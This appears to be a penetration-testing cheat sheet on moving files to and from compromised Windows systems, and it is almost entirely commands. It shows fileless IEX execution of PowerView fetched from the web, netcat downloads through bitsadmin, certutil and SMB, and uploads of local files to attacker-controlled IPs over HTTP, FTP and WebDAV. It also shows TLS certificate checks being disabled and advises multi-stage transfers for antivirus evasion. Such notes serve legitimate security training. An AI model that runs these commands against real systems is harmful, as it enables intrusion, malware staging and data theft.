# Windows File Transfers

## Windows File Transfers

Windows systems provide various native and third-party methods for transferring files across networks. Understanding these transfer techniques is crucial for penetration testers, especially when moving tools to and from compromised systems.

### Base64 Transfer Technique

For small files, Base64 encoding provides a method to transfer data without requiring direct file transfer protocols.

#### Encoding and Decoding Files

```bash
# Linux: Encode file
cat id_rsa | base64 -w 0
```

```powershell
# Windows: Decode file
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNC..."))

# Windows: Encode file
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### PowerShell Web Transfers

PowerShell offers multiple built-in methods to download files from web servers.

#### Download Operations

```powershell
# Using Net.WebClient
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Asynchronous download
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

# Using Invoke-WebRequest
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# With -UseBasicParsing (for IE first-launch configuration issues)
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -UseBasicParsing -OutFile PowerView.ps1
```

#### SSL/TLS Errors Bypass

```powershell
# Bypass certificate validation
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### Fileless Execution

```powershell
# Execute script directly in memory
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Using pipeline
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1') | IEX
```

### SMB File Transfers

Server Message Block (SMB) protocol running on TCP/445 is commonly used in Windows environments for file sharing.

#### Setting Up SMB Server on Linux

```bash
# Basic SMB share
sudo impacket-smbserver share -smb2support /tmp/smbshare

# SMB with authentication
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

#### Connecting from Windows

```cmd
# Copy file directly
copy \\192.168.220.133\share\nc.exe

# Mount with credentials if blocked
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

#### WebDAV for SMB over HTTP

When direct SMB is blocked, WebDAV provides SMB functionality over HTTP:

```bash
# Start WebDAV server
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```cmd
# Connect to WebDAV share
dir \\192.168.49.128\DavWWWRoot
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

### FTP File Transfers

File Transfer Protocol (FTP) on TCP ports 20/21 provides another option when SMB is unavailable.

#### Setting Up FTP Server on Linux

```bash
# Install pyftpdlib
sudo pip3 install pyftpdlib

# Start FTP server
sudo python3 -m pyftpdlib --port 21

# Allow uploads
sudo python3 -m pyftpdlib --port 21 --write
```

#### PowerShell FTP Download

```powershell
# Download via WebClient
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

#### Non-Interactive FTP Download

```cmd
# Create command file for FTP
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### Upload Operations

#### PowerShell Base64 Encoding for Upload

```powershell
# Encode file content
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

#### PowerShell Web Upload

```powershell
# Using Invoke-RestMethod
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

# Base64 Web Upload
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

#### FTP Upload

```powershell
# PowerShell FTP upload
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

```cmd
# Non-interactive FTP upload
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

### BITS (Background Intelligent Transfer Service)

BITS is a Windows component designed for efficient file transfers with bandwidth throttling.

```powershell
# Download using bitsadmin
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe

# Using PowerShell BITS module
Import-Module bitstransfer
Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

### CertUtil Downloads

CertUtil, a Windows certificate utility, can be repurposed for file downloads.

```cmd
# Download a file
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

### Common Errors and Mitigations

#### IE First-Launch Error

```powershell
# Error message:
# The response content cannot be parsed because the Internet Explorer engine is not available

# Solution:
Invoke-WebRequest https://domain.com/file.txt -UseBasicParsing
```

#### SSL/TLS Certificate Error

```powershell
# Error message:
# Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."

# Solution:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### SMB Access Denied Error

```cmd
# Error message:
# You can't access this shared folder because your organization's security policies block unauthenticated guest access

# Solution: Use authentication
net use n: \\192.168.220.133\share /user:test test
```

### Best Practices

1. **Use HTTPS/SSL** when transferring sensitive data
2. **Clean up files** after transfer when possible
3. **Consider multi-stage transfers** for AV evasion
4. **Validate file integrity** using file hashes
5. **Use native tools** to avoid introducing new binaries
6. **Test transfers** on similar systems before actual use
